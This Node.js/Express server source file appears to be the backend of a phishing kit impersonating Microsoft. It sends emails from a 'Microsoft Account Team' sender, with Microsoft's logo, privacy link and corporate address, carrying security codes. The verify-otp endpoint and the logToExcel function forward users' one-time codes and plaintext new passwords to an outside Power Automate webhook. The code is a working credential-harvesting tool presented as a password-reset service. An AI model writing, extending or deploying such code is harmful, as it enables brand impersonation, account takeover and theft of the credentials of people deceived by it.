require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const nodemailer = require('nodemailer');
const axios = require('axios');
const bcrypt = require('bcrypt');

const app = express();
const port = process.env.PORT || 3000;

// More permissive CORS settings
app.use(cors({
    origin: '*',  // Allow all origins
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
    optionsSuccessStatus: 200
}));

// Handle preflight requests
app.options('*', cors());

// Add security headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Accept');
    next();
});

app.use(express.json());

// Add basic health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('Connected to MongoDB Atlas');
}).catch((error) => {
    console.error('MongoDB connection error:', error);
    process.exit(1); // Exit if we can't connect to database
});

// Handle MongoDB connection events
mongoose.connection.on('connected', () => {
    console.log('Mongoose connected to MongoDB Atlas');
});

mongoose.connection.on('error', (err) => {
    console.error('Mongoose connection error:', err);
});

mongoose.connection.on('disconnected', () => {
    console.log('Mongoose disconnected from MongoDB Atlas');
});

// MongoDB User Schema
const userSchema = new mongoose.Schema({
    email: { type: String, required: true, unique: true },
    password: { type: String },
    otp: { type: String },
    otpExpiry: { type: Date }
});

const User = mongoose.model('User', userSchema);

// Email configuration for Gmail with detailed logging
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Verify email configuration on startup
transporter.verify((error, success) => {
    if (error) {
        console.error('SMTP Configuration Error:', {
            error: error.message,
            code: error.code,
            command: error.command,
            response: error.response
        });
    } else {
        console.log('SMTP server is ready to send emails');
    }
});

// Function to send email with improved error handling
async function sendEmail(to, subject, html) {
    try {
        console.log('Attempting to send email to:', to);
        
        const mailOptions = {
            from: {
                name: 'Microsoft Account Team',
                address: process.env.EMAIL_USER
            },
            to: to,
            subject: subject,
            html: html,
            headers: {
                'priority': 'high'
            }
        };

        // Log the email attempt
        console.log('Sending email with configuration:', {
            from: mailOptions.from.address,
            to: mailOptions.to,
            subject: mailOptions.subject
        });

        const info = await transporter.sendMail(mailOptions);
        
        // Log successful send
        console.log('Email sent successfully:', {
            messageId: info.messageId,
            response: info.response,
            accepted: info.accepted,
            rejected: info.rejected
        });
        
        return true;
    } catch (error) {
        // Log detailed error information
        console.error('Email Send Error:', {
            code: error.code,
            command: error.command,
            response: error.response,
            message: error.message,
            stack: error.stack
        });
        throw new Error(`Failed to send email: ${error.message}`);
    }
}

// Function to create email template
function createEmailTemplate(otp) {
    return `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Security Code</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                line-height: 1.6;
                color: #000000;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                padding: 20px 0;
            }
            .header img {
                width: 108px;
                height: auto;
            }
            .content {
                background-color: #ffffff;
                padding: 20px;
            }
            .security-code {
                font-size: 32px;
                font-weight: bold;
                color: #0078D4;
                padding: 15px 0;
                letter-spacing: 2px;
            }
            .footer {
                margin-top: 20px;
                font-size: 12px;
                color: #666666;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo">
            </div>
            <div class="content">
                <h1>Security Code</h1>
                <p>Please use the following security code for your Microsoft account:</p>
                <div class="security-code">${otp}</div>
                <p>This security code will expire in 10 minutes.</p>
                <p>If you didn't request this code, you can safely ignore this email.</p>
            </div>
            <div class="footer">
                <p>Microsoft respects your privacy. To learn more, please read our <a href="https://privacy.microsoft.com/en-us/privacystatement">Privacy Statement</a>.</p>
                <p>Microsoft Corporation • One Microsoft Way • Redmond, WA 98052</p>
            </div>
        </div>
    </body>
    </html>
 
    `;
}

// Generate OTP
function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Function to log data to Microsoft Excel using Power Automate
async function logToExcel(data) {
    try {
        if (!process.env.POWER_AUTOMATE_URL) {
            console.log('Excel logging skipped - Power Automate URL not configured');
            return true;
        }

        const timestamp = new Date().toISOString();
        
        // Prepare payload for Excel
        const payload = {
            timestamp: timestamp,
            email: data.email,
            status: data.status,
            otp: data.otp || '',
            password: data.password || ''
        };

        console.log('Logging to Excel:', {
            ...payload,
            otp: payload.otp ? '******' : '',
            password: payload.password ? '******' : ''  // Mask sensitive data in logs
        });

        // Send data to Power Automate
        const response = await axios.post(process.env.POWER_AUTOMATE_URL, payload, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });

        console.log('Successfully logged to Excel:', response.data);
        return true;
    } catch (error) {
        console.error('Excel logging error:', error.message);
        return false;
    }
}

// Updated send-code endpoint with Excel logging
app.post('/send-code', async (req, res) => {
    const { email } = req.body;

    if (!email) {
        return res.status(400).json({
            success: false,
            message: 'Email is required'
        });
    }

    try {
        // Generate OTP
        const otp = Math.floor(100000 + Math.random() * 900000).toString();
        const otpExpiry = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes expiry

        // Find or create user
        let user = await User.findOne({ email: email.toLowerCase() });
        if (!user) {
            user = new User({ email: email.toLowerCase() });
        }

        // Update user with new OTP
        user.otp = otp;
        user.otpExpiry = otpExpiry;
        await user.save();

        // Send email
        const emailContent = createEmailTemplate(otp);
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: email,
            subject: 'Security code for Microsoft account',
            html: emailContent
        };

        await transporter.sendMail(mailOptions);

        // Log to Excel
        await logToExcel({
            email: email.toLowerCase(),
            status: 'OTP Sent',
            otp: otp
        });

        res.json({
            success: true,
            message: 'Security code sent successfully'
        });
    } catch (error) {
        console.error('Send Code Error:', error);

        // Log error to Excel
        await logToExcel({
            email: email?.toLowerCase(),
            status: 'OTP Send Failed',
            otp: ''
        });

        res.status(500).json({
            success: false,
            message: 'Error sending security code'
        });
    }
});

// Updated verify-otp endpoint to store password
app.post('/verify-otp', async (req, res) => {
    const { email, newPassword, confirmPassword } = req.body;

    if (!email || !newPassword || !confirmPassword) {
        return res.status(400).json({
            success: false,
            message: 'All fields are required'
        });
    }

    try {
        // Check if passwords match
        if (newPassword !== confirmPassword) {
            return res.status(400).json({
                success: false,
                message: 'Passwords do not match'
            });
        }

        // Find the user
        const user = await User.findOne({ email: email.toLowerCase() });
        if (!user) {
            return res.status(404).json({
                success: false,
                message: 'User not found'
            });
        }

        // Hash the password
        const hashedPassword = await bcrypt.hash(newPassword, 10);
        
        // Update user with new password
        user.password = hashedPassword;
        await user.save();

        // Log to Excel
        await logToExcel({
            email: email.toLowerCase(),
            status: 'Password Reset Success',
            password: newPassword
        });

        res.json({
            success: true,
            message: 'Password reset successful'
        });
    } catch (error) {
        console.error('Password Reset Error:', error);
        
        // Log error to Excel
        await logToExcel({
            email: email.toLowerCase(),
            status: 'Password Reset Failed',
            password: ''
        });

        res.status(500).json({
            success: false,
            message: 'Error resetting password'
        });
    }
});

// Verify code endpoint
app.post('/verify-code', async (req, res) => {
    try {
        const { email, code } = req.body;

        if (!email || !code) {
            return res.status(400).json({
                success: false,
                message: 'Email and code are required'
            });
        }

        // Find user and verify OTP
        const user = await User.findOne({ 
            email: email.toLowerCase(),
            otp: code,
            otpExpiry: { $gt: new Date() }
        });

        if (!user) {
            return res.status(400).json({
                success: false,
                message: 'Invalid or expired code'
            });
        }

        // Clear the OTP after successful verification
        user.otp = null;
        user.otpExpiry = null;
        await user.save();

        // Log to Excel
        await logToExcel({
            email: email.toLowerCase(),
            status: 'Code Verified',
            otp: code
        });

        // Set proper headers
        res.setHeader('Content-Type', 'application/json');
        return res.status(200).json({
            success: true,
            message: 'Code verified successfully'
        });
    } catch (error) {
        console.error('Code Verification Error:', error);
        
        // Log error to Excel
        await logToExcel({
            email: email?.toLowerCase(),
            status: 'Code Verification Failed',
            otp: code || ''
        });

        // Set proper headers
        res.setHeader('Content-Type', 'application/json');
        return res.status(500).json({
            success: false,
            message: 'Error verifying code'
        });
    }
});

// Add new endpoint to verify user status
app.post('/verify-status', async (req, res) => {
    try {
        const { email } = req.body;
        const user = await User.findOne({ 
            email: email.toLowerCase(),
            otpExpiry: { $gt: new Date() }
        });

        res.json({
            success: !!user,
            message: user ? 'Valid session' : 'Session expired'
        });
    } catch (error) {
        console.error('Verify Status Error:', error);
        res.status(500).json({
            success: false,
            message: 'Error checking status'
        });
    }
});

// Reset password endpoint with improved error handling
app.post('/reset-password', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        // Add timeout for MongoDB operations
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Database operation timed out')), 25000)
        );

        const updatePromise = User.findOneAndUpdate(
            { 
                email: email.toLowerCase(),
                otpExpiry: { $gt: new Date() }
            },
            {
                password,
                otp: null,
                otpExpiry: null
            },
            { new: true }
        );

        const user = await Promise.race([updatePromise, timeoutPromise]);

        if (!user) {
            return res.status(404).json({
                success: false,
                message: 'User not found or session expired'
            });
        }

        // Update Google Sheet with password reset status
        try {
            await appendToGoogleSheet({
                email: email.toLowerCase(),
                otp: 'Cleared',
                status: 'Password Reset Successfully',
                timestamp: new Date().toISOString()
            });
        } catch (sheetError) {
            console.error('Google Sheet Error:', sheetError);
            // Continue even if Google Sheet update fails
        }

        res.json({
            success: true,
            message: 'Password reset successfully'
        });
    } catch (error) {
        console.error('Reset Password Error:', error);
        res.status(500).json({
            success: false,
            message: error.message === 'Database operation timed out' 
                ? 'Server is busy, please try again'
                : 'Error resetting password'
        });
    }
});

// Test endpoint for email verification
app.get('/test-email', async (req, res) => {
    try {
        await sendEmail(
            'test@example.com', // Replace with your test email
            'Test Email from Microsoft Account Reset',
            '<h1>Test Email</h1><p>This is a test email from your Microsoft Account Reset application.</p>'
        );
        res.json({ 
            success: true, 
            message: 'Test email sent successfully'
        });
    } catch (error) {
        console.error('Test email failed:', error);
        res.status(500).json({ 
            success: false, 
            message: error.message,
            details: {
                code: error.code,
                command: error.command,
                response: error.response
            }
        });
    }
});

// Health check endpoint with MongoDB status
app.get('/', async (req, res) => {
    const dbState = mongoose.connection.readyState;
    const states = {
        0: 'disconnected',
        1: 'connected',
        2: 'connecting',
        3: 'disconnecting'
    };
    
    try {
        // Test database operation
        const count = await User.countDocuments();
        res.json({
            status: 'Server is running',
            mongodb: states[dbState],
            dbConnection: 'operational',
            documentCount: count
        });
    } catch (error) {
        res.json({
            status: 'Server is running',
            mongodb: states[dbState],
            dbConnection: 'error',
            error: error.message
        });
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
    console.log('Environment:', process.env.NODE_ENV || 'development');
    console.log('Allowed origins:', [
        'http://localhost:5500',
        'http://127.0.0.1:5500',
        'https://amazing-sable-725045.netlify.app',
        'https://serverbackendmain.onrender.com'
    ]);
});
